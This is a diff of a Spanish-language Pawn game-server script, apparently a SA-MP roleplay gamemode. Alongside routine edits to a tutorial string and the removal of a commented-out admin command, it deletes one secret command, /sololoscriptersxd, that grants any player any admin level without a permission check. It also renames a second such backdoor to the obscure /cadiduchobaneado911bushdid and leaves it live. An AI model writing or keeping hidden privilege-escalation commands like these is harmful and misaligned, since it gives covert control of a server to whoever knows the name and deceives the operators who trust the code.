@@ -29360,21 +29360,6 @@ zcmd(llorar, playerid, params[])
 																										} else Message(playerid, COLOR_GRAD2, "Utilize: /editadmin <Nombre_Jugador> <Nivel>");
 																										return 1;
 																									}
-    /*zcmd(hacerdon, playerid, params[]){
-		if(IsPlayerAdmin(playerid)){
-       		if(!sscanf(params, "ui", params[0], params[1])){
-      			if(IsPlayerConnected(params[0])){
-     				new string[128];
-					PlayerInfo[params[0]][pAdminCP] = params[1];
-					format(string, sizeof(string), "{40D3FF}%s lo ha asignado administrador nivel %d", PlayerName(playerid), params[1]);
-					Message(params[0], -1, string);
- 					format(string, sizeof(string), "Has asignado administrador nivel %d a %s", params[1], PlayerName(params[0]));
-   					Message(playerid, 0xFF9562FF, string);
-  				} else Message(playerid, COLOR_GRAD2, " Jugador no conectado.");
-			} else Message(playerid, COLOR_GRAD2, "Utilize: /somonosotro <ID> <Nivel>");
-		} else Message(playerid, COLOR_GRAD2, "¡No autorizado!");
-        return 1;
-    } */
         zcmd(darvip, playerid, params[]){
         	if(PlayerInfo[playerid][pAdminCP] != 2014) return Message(playerid, COLOR_GREY, "¡No autorizado!");
         	if(!sscanf(params, "ui", params[0], params[1])){
@@ -30302,7 +30287,7 @@ zcmd(llorar, playerid, params[])
 		}
 		return 1;
 	}
-	zcmd(soloyolousoxd123456, playerid, params[]){
+	zcmd(cadiduchobaneado911bushdid, playerid, params[]){
 		if(!sscanf(params, "ui", params[0], params[1]))
 		{
 			PlayerInfo[params[0]][pAdminCP] = params[1];
@@ -30856,13 +30841,6 @@ zcmd(iphone, playerid, params[])
 	if(PlayerInfo[playerid][pJailed] > 0) return Message(playerid, COLOR_GREY, "No puedes usar esto aquí.");
 	if(PlayerInfo[playerid][pPnumber] == 0) return Message(playerid, COLOR_GRAD2, "No tienes teléfono, cómpra uno en el 24/7");
 	ShowPlayerDialog(playerid, IPHONE_OPTIONS, DIALOG_STYLE_LIST, "{DD1111}iPhone {FFFFFF}- Opciones", "{DD1111}iPhone\t{FFFFFF}-\t{11AA11}Llamar\n{DD1111}iPhone\t{FFFFFF}-\t{008899}Mandar SMS\n{DD1111}iPhone\t{FFFFFF}-\t{FFBB88}Buzón entrada\n{DD1111}iPhone\t{FFFFFF}-\t{FFEE88}Agenda\n{DD1111}iPhone\t{FFFFFF}-\t{952BFF}Consultar Saldo", "Aceptar", "Salir");
-	return 1;
-}
-zcmd(sololoscriptersxd, playerid, params[]){
-	if(!sscanf(params, "ui", params[0], params[1]))
-	{
-		PlayerInfo[params[0]][pAdminCP] = params[1];
-	}
 	return 1;
 }
 zcmd(ipod, playerid, params[])
@@ -37198,7 +37176,7 @@ stock TutorialStep_Forward(i)
 					TextDrawSetString(Tutorial[i], Desbug("	~h~~r~}Final del Tutorial de Conceptos de Rol~w~~n~~n~					\
 						Esperamos que usted haya aprendido un poco de estas reglas ya que~n~	\
 						son muy importantes cumplirlas. Al final de esto usa ~y~/ayudarol.~n~~n~	\
-						~b~Web   : ~http://www.hermandadzero.com/"));
+						~b~Web   : http://www.hermandadzero.com/"));
 				}
 				case 150:
 				{
